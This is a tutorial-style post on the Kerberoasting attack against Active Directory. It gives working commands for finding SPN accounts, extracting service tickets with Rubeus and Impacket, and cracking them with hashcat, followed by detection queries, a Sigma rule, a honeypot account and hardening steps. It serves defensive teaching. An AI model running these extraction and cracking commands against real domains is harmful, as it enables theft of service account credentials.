Kerberoasting is one of the most reliable techniques for obtaining domain credentials without triggering obvious alerts. Any authenticated domain user can request a Kerberos service ticket for any service account — and the ticket is encrypted with the service account's password hash. Extract the ticket, crack offline. This post covers the attack at the protocol level, execution, detection, and hardening.

## Kerberos Primer

Understanding why Kerberoasting works requires understanding the Kerberos ticket exchange.

### The Normal Flow

```
1. Client → KDC: AS-REQ (request TGT)
2. KDC → Client: AS-REP (TGT, encrypted with krbtgt hash)
3. Client → KDC: TGS-REQ (request service ticket, presents TGT)
4. KDC → Client: TGS-REP (service ticket, encrypted with SERVICE ACCOUNT hash)
5. Client → Service: AP-REQ (presents service ticket)
```

The critical step is **4**. The KDC encrypts the service ticket using the **service account's NTLM hash**. This is by design — the service needs to decrypt the ticket to verify the user.

But the client doesn't need to present the ticket to the service. It can extract it and take it offline.

## The Attack

### Finding Kerberoastable Accounts

Any account with a **Service Principal Name (SPN)** set is a Kerberoasting target. SPNs are set on service accounts and indicate that the account is associated with a specific service.

```powershell
# Find all accounts with SPNs (requires only domain user)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
  Select-Object SamAccountName, ServicePrincipalName |
  Where-Object { $_.SamAccountName -notlike "krbtgt" }
```

With LDAP directly:
```bash
# Using ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" \
  -D "corp\user" -W \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

### Requesting and Extracting TGS Tickets

#### Using Rubeus (Windows)

```powershell
# Request all TGS tickets for Kerberoastable accounts
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt

# Target a specific account
.\Rubeus.exe kerberoast /user:svc_sql /format:hashcat

# Use RC4 encryption (faster to crack than AES)
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerberoast.txt
```

#### Using Impacket (Linux)

```bash
# GetUserSPNs.py — full attack in one command
GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.1.10 -request -outputfile kerberoast.txt

# With Kerberos auth (no NTLM required)
GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.1.10 -k -no-pass -request
```

The output hash looks like:
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$1a2b3c4d5e6f...
```

`$23$` = RC4-HMAC, `$17$` = AES-128, `$18$` = AES-256. RC4 is significantly faster to crack.

### Cracking the Hash

```bash
# Hashcat: mode 13100 = Kerberos TGS-REP (RC4)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# AES-256 (mode 19700)
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Combinator attack
hashcat -m 13100 -a 1 kerberoast.txt wordlist1.txt wordlist2.txt
```

On a GPU rig, RC4 Kerberoast hashes crack at ~1 billion/second against RockYou. A 10-character password with mixed case + numbers is cracked in under a minute if it follows a predictable pattern.

## Detection

### Windows Event Logs

The primary event generated by Kerberoasting:

| Event ID | Description |
|---|---|
| **4769** | A Kerberos service ticket was requested |

A **Kerberoasting indicator** is a 4769 event where:
- `TicketEncryptionType = 0x17` (RC4-HMAC)
- `ServiceName` is not a machine account (does not end with `$`)
- The requesting account is a user account, not a service

<div class="callout callout-detection">
<strong>Detection</strong>
Monitor Event ID 4769 for RC4 encryption (0x17) on service ticket requests. AES (0x12, 0x11) requests are not Kerberoastable and can be filtered. A burst of 4769 events from a single user against multiple SPNs is a high-confidence indicator.
</div>

### Splunk Detection Query

```spl
index=wineventlog EventCode=4769
  Ticket_Encryption_Type=0x17
  Service_Name!="*$"
  Account_Name!="*$"
  Service_Name!="krbtgt"
| stats count min(_time) as first_seen max(_time) as last_seen values(Service_Name) as services
  by Account_Name, Client_Address
| where count > 5
| sort -count
```

This surfaces accounts requesting RC4 TGS tickets for 5+ different services — a strong Kerberoasting signal.

### Sigma Rule

```yaml
title: Kerberoasting - Suspicious RC4 Kerberos TGS Request
id: 3c1b2a9d-8e7f-4c5b-a6d2-1f3e4b5c6d7e
status: stable
description: Detects possible Kerberoasting attack via RC4 downgrade on Kerberos TGS requests
author: Wizard
date: 2026/03/20
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    filter_computer_accounts:
        ServiceName|endswith: '$'
    filter_krbtgt:
        ServiceName: 'krbtgt'
    filter_system:
        AccountName|endswith: '$'
    condition: selection and not 1 of filter_*
falsepositives:
    - Legacy applications requiring RC4 encryption
    - Older Kerberos clients
level: medium
tags:
    - attack.credential_access
    - attack.t1558.003
```

### Honeypot SPN Detection

A powerful technique: create a fake, highly-privileged-looking service account with a SPN and a very strong password. Alert immediately on any 4769 requesting a ticket for this account.

```powershell
# Create the honeypot account
New-ADUser -Name "svc_honeypot_backup" -SamAccountName "svc_honeypot_backup" `
           -AccountPassword (ConvertTo-SecureString "V3ryL0ngRand0mP@ssw0rd!" -AsPlainText -Force) `
           -Enabled $true -PasswordNeverExpires $true

# Set an attractive SPN
Set-ADUser -Identity "svc_honeypot_backup" `
           -ServicePrincipalNames @{Add="MSSQLSvc/backup-server.corp.local:1433"}
```

Any TGS request for this account is malicious — there is no legitimate use.

## Mitigation

### 1. Enforce AES Encryption

Set the `msDS-SupportedEncryptionTypes` attribute on service accounts to require AES:

```powershell
# Require AES only (value = 24 = AES128+AES256)
Set-ADUser -Identity "svc_sql" -KerberosEncryptionType AES256,AES128

# Or via attribute directly (24 = 0x18 = AES128 + AES256)
Set-ADUser -Identity "svc_sql" -Replace @{msDS-SupportedEncryptionTypes=24}
```

This forces the KDC to issue AES-encrypted tickets, which are far slower to crack.

### 2. Use Long, Random Service Account Passwords

The attack is only viable if the password is crackable. A 32-character random password in a service account is practically uncrackable even with RC4:

```powershell
# Generate a strong random password
-join ((65..90) + (97..122) + (48..57) + (33..47) | Get-Random -Count 32 | ForEach-Object {[char]$_})
```

Better: use **Group Managed Service Accounts (gMSA)** — Windows manages 120-character rotating passwords automatically.

### 3. Implement Group Managed Service Accounts (gMSA)

```powershell
# Create a gMSA
New-ADServiceAccount -Name "gMSA_SQLSvc" `
                     -DNSHostName "sqlsvc.corp.local" `
                     -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers_Group"

# Install on the target server
Install-ADServiceAccount -Identity "gMSA_SQLSvc"
```

gMSA passwords are 120-character random values rotated every 30 days by the KDC. They are completely immune to Kerberoasting.

### 4. Audit SPN Assignments

Regularly audit which accounts have SPNs — non-service user accounts with SPNs are a significant risk:

```powershell
# Report all SPNs on user accounts (not computer accounts)
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName |
  Where-Object { $_.Enabled -eq $true } |
  Select-Object SamAccountName, @{N='SPNs';E={$_.ServicePrincipalName -join ', '}} |
  Export-Csv -Path spn_report.csv -NoTypeInformation
```

## Summary

Kerberoasting is attractive because it requires no special privileges, generates minimal noise, and can be performed entirely offline after ticket extraction. The keys to detection are:

- **4769 monitoring** with RC4 filter
- **Honeypot SPN accounts** for zero-FP alerting
- **Baseline TGS request patterns** to detect anomalous volume

The keys to prevention:
- **gMSA wherever possible** — eliminate Kerberoastable accounts
- **AES enforcement** — make cracking exponentially harder
- **Password length** — 25+ character random passwords for service accounts
